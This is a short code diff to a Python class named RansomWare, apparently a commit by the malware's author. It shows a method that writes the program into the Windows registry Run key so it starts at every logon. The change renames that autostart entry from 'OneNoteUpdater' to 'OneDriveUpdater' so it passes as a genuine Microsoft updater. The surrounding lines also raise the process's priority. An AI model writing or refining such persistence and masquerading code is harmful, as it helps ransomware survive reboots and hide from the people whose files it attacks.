@@ -132,7 +132,7 @@ class RansomWare:
         p = psutil.Process(pid)
         p.nice(psutil.HIGH_PRIORITY_CLASS)
 
-    def add_to_startup(self, file_path, key_name="OneNoteUpdater"):
+    def add_to_startup(self, file_path, key_name="OneDriveUpdater"):
         key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
         key_type = winreg.HKEY_CURRENT_USER
         key = winreg.OpenKey(key_type, key_path, 0, winreg.KEY_SET_VALUE)
